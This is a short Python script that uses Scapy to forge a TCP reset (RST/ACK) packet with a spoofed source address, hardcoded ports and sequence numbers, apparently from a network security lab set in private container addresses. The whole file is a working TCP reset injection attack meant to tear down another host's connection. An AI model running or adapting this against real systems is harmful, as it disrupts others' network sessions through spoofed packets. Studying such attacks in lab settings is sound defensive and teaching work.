#!/usr/bin/python3
import sys
from scapy.all import *

print("SENDING RESET PACKET.........")
IPLayer = IP(src="172.17.0.4", dst="172.17.0.3")
TCPLayer = TCP(sport=1234, dport=48822,flags="RA", seq=1133944017, ack=579873452)
pkt = IPLayer/TCPLayer
ls(pkt)
send(pkt, verbose=0)

